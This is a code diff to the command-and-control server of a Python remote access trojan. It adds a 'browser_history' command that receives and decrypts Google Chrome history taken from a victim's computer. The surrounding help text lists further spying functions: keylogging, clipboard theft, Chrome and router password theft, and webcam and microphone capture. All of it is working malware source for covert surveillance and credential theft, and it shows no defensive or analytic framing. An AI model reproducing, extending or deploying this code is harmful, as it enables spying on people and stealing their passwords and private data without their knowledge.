@@ -75,6 +75,7 @@ list_of_commands = "---------------------------------------- List of commands --
                    "\ncopy_clipboard --------- copies clipboard of client computer and sends to host computer" \
                    "\nkey_logger ------------- listens to keyboard of client computer for set period of time (seconds)" \
                    "\nbrowser_password ------- gets saved passwords from google chrome" \
+                   "\nbrowser_history -------- gets history from Google Chrome" \
                    "\nrouter_password --------- gets password of all known routers to computer" \
                    "\nwebcam ----------------- captures image from webcam" \
                    "\nlisten ----------------- listens on mic of client computer for set period of time (seconds)" \
@@ -486,6 +487,17 @@ while True:
                 ebrowser_password  = recv_one_message(conn)
                 browser_password = AES256.decrypt(ebrowser_password, d_key13)
                 print "\n\n" + browser_password
+
+            elif int(float(command)) == 57449330:
+                e_key15 = recv_one_message(conn)
+                print "\nRecieved encrypted key"
+                decryptor15 = PKCS1_OAEP.new(keyPair)
+                d_key15 = decryptor15.decrypt(e_key15)
+                print "\nDecrypted encrypted key"
+
+                ebrowser_history = recv_one_message(conn)
+                browser_history = AES256.decrypt(ebrowser_history, d_key15)
+                print "\n\n" + browser_history
 
             # 'router_passowrd'
             elif int(float(command)) == 2083072854:
